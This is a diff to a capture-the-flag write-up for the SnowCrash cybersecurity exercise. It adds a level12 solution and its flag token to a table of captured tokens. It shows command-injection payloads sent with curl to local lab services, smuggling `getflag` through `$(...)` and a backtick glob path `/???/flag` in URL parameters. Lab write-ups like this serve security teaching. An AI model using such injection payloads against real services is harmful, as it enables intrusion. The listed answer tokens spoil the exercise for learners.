@@ -24,6 +24,7 @@ This project will be an introduction to cyber security.
 | flag10  | woupa2yuojeeaaed06riuj63c |
 | level11 | feulo4b72j7edeahuete3no7c |
 | level12 | fa6v5ateaw21peobuub8ipe6s |
+| level13 | g1qKMiRpXf53AWhDaU7FEkczr |
 
 ## Script
 
@@ -170,4 +171,11 @@ Check flag.Here is your token : feulo4b72j7edeahuete3no7c
 level11@SnowCrash:~$ curl localhost:5151/'$(getflag) > /tmp/flag' && cat /tmp/flag
 Password: Erf nope..
 GET /Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s HTTP/1.1
+```
+
+### level12
+
+```bash
+level12@SnowCrash:~$ echo '#!/bin/bash' > /tmp/FLAG && echo 'getflag > /tmp/FLAG' >> /tmp/FLAG && chmod 777 /tmp/FLAG && curl 'localhost:4646?x=`/???/flag`&y=toto' && cat /tmp/FLAG
+.Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
 ```
